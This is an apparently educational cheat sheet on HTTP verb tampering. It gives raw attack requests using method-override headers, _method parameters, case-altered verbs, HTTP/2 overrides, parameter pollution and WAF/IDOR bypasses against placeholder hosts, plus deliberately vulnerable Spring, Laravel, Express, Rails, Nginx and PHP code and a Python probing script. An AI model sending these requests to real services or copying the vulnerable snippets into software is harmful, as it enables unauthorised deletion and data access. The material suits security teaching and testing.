### üõ°Ô∏è HTTP Verb Tampering Vulnerability

**HTTP Verb Tampering** (or HTTP Method Tampering) is a security flaw where an application's access control mechanisms are inconsistent across different HTTP methods, allowing an attacker to bypass authorization by using an alternative verb.

  * **Vulnerability Type:** Broken Access Control / Inconsistent Security Policy
  * **Impact:** Unauthorized actions (data deletion, modification, or elevated access) on restricted resources
  * **Root Cause:** A discrepancy in how security layers (WAFs, load balancers, web servers, and application frameworks) validate and interpret the HTTP method of a single request

-----

### üìù Basic Verb Tampering Techniques

* **Method Override Headers (Header Tunneling)**

  ```http
  POST /api/users/101 HTTP/1.1
  Host: target.com
  X-HTTP-Method-Override: DELETE
  Content-Type: application/json
  Content-Length: 15
  
  {"status":"active"}
  ```

  **Vulnerable Java/Spring Boot Code:**

  ```java
  @RestController
  public class UserController {
      @RequestMapping(value = "/api/users/{id}", method = RequestMethod.POST)
      public String updateUser(@PathVariable String id) {
          // Method override happens before this method is called
          return "User updated";
      }
      
      @RequestMapping(value = "/api/users/{id}", method = RequestMethod.DELETE)
      @PreAuthorize("hasRole('ADMIN')")
      public String deleteUser(@PathVariable String id) {
          // This requires admin role but can be bypassed
          return "User deleted";
      }
  }
  ```

  **Why it's used:** To bypass method-based access controls by tunneling restricted methods through allowed ones.
  **How it works:** Framework middleware processes override headers before application-level security checks.

* **Parameter-Based Override**

  ```http
  POST /api/documents/99 HTTP/1.1
  Host: target.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 13
  
  _method=DELETE
  ```

  **Vulnerable PHP/Laravel Code:**

  ```php
  // routes/web.php
  Route::delete('/api/documents/{id}', 'DocumentController@destroy')
      ->middleware('admin');
  
  Route::post('/api/documents/{id}', 'DocumentController@update')
      ->middleware('user');
  
  // DocumentController.php
  public function destroy($id) {
      // Requires admin but can be accessed via POST + _method=DELETE
      Document::find($id)->delete();
      return response()->json(['message' => 'Document deleted']);
  }
  ```

  **Why it's used:** Exploits framework method override features intended for HTML form compatibility.
  **How it works:** Framework routing uses parameter values instead of actual HTTP methods.

* **Case Manipulation (HTTP Method Smuggling)**

  ```http
  dElEtE /admin/reset HTTP/1.1
  Host: vulnerable.com
  Content-Length: 0
  ```

  **Vulnerable Node.js/Express Code:**

  ```javascript
  const express = require('express');
  const app = express();
  
  // WAF blocks "DELETE" but not case variations
  app.delete('/admin/reset', (req, res) => {
      // This executes with dElEtE method
      resetSystem();
      res.send('System reset');
  });
  ```

  **Why it's used:** Bypasses case-sensitive security filters while backend processes the request.
  **How it works:** Web servers often normalize method names while WAFs may do exact string matching.

-----

### ‚öôÔ∏è Advanced Exploitation and Framework Specifics

  * **Framework-Specific Overrides**

    ```http
    POST /api/items/1 HTTP/1.1
    Host: rails-app.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 45
    
    _method=DELETE&authenticity_token=abc123xyz
    ```

    **Ruby on Rails Vulnerability:**

    ```ruby
    # config/application.rb
    # Method override is enabled by default in Rails
    
    # app/controllers/items_controller.rb
    before_action :admin_required, only: [:destroy]
    
    def destroy
      @item = Item.find(params[:id])
      @item.destroy
      redirect_to items_path
    end
    ```

    **Why it's used:** Framework-specific override mechanisms that bypass method restrictions.
    **How it works:** Authenticity tokens protect against CSRF but not method tampering.

  * **Protocol-Level Manipulation (HTTP/2 Method Smuggling)**

    ```http
    :method = POST
    :path = /admin/delete-user/10
    x-http-method-override = DELETE
    content-type = application/json
    ```

    **Vulnerable Architecture:**

    ```
    Client (HTTP/2) ‚Üí Load Balancer (HTTP/2) ‚Üí Backend (HTTP/1.1)
    ```
    **Nginx Configuration Vulnerability:**

    ```nginx
    location /admin/ {
        # Only checks actual method, not overrides
        if ($request_method != GET) {
            return 403;
        }
        proxy_pass http://backend;
    }
    ```

    **Why it's used:** Exploits protocol translation inconsistencies between components.
    **How it works:** Frontend processes see allowed methods while backend processes overrides.

  * **Parameter Pollution**

    ```http
    POST /admin/users/123 HTTP/1.1
    Host: target.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 45
    
    _method=GET&_method=DELETE&method=PATCH&id=123
    ```
    **Vulnerable PHP Code:**

    ```php
    <?php
        // Framework processes last _method parameter
        $method = $_POST['_method'] ?? $_SERVER['REQUEST_METHOD'];
        
        if ($method === 'DELETE') {
            // This executes due to parameter pollution
            deleteUser($_POST['id']);
        }
    ?>
    ```

    **Why it's used:** Exploits how frameworks handle duplicate parameters.
    **How it works:** Many frameworks use the last parameter value, allowing method override.

-----

### üîß Advanced Attack Scenarios

  * **Bypassing Web Application Firewalls (WAF)**

    ```http
    POST /api/admin/users HTTP/1.1
    Host: target.com
    X-HTTP-Method: GET
    X-Method-Override: PUT
    X-HTTP-Method-Override: DELETE
    Content-Type: application/json
    
    {"action":"delete","user_id":101}
    ```

    **WAF Bypass Logic:**
    * WAF sees POST method (allowed)
    * Backend processes last override header (DELETE)
    * Attack executes despite WAF protection

  * **Combining with IDOR Attacks**

    ```http
    POST /api/users/505/profile HTTP/1.1
    Host: target.com
    X-HTTP-Method-Override: GET
    Content-Type: application/json
    
    {"user_id":506}
    ```

    **Why it's used:** Double bypass - method restrictions and access controls.
    **How it works:** Changes method to read data while manipulating object references.

  * **Time-Based Method Detection**

    ```python
    import requests
    import time
    
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
    override_headers = ['X-HTTP-Method-Override', 'X-Method-Override', 'X-HTTP-Method']
    
    def detect_methods(url):
        for method in methods:
            # Test direct method
            start = time.time()
            response = requests.request(method, url)
            direct_time = time.time() - start
            
            # Test override
            for header in override_headers:
                start = time.time()
                response = requests.post(url, headers={header: method})
                override_time = time.time() - start
                
                if response.status_code != 405 and abs(direct_time - override_time) < 0.1:
                    print(f"Method {method} accessible via {header}")
    ```

-----

**Made with love by VIsh0k**